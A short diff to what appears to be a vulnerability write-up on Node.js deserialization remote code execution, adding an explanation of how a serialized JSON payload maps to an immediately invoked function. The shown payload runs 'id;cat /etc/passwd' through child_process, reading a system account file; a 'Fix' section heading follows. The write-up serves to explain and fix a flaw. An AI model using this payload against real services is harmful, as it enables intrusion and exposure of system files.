@@ -6,6 +6,16 @@ Json to exploit the vulnerability
 {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });}()"}
 ```
 
+which is the serialized version of
+```json
+var y = {
+ rce : function(){
+ require('child_process').exec('id;cat /etc/passwd', function(error, stdout, stderr) { console.log(stdout) });
+ }(),
+}
+```
+
+
 ## Fix
 ---
 
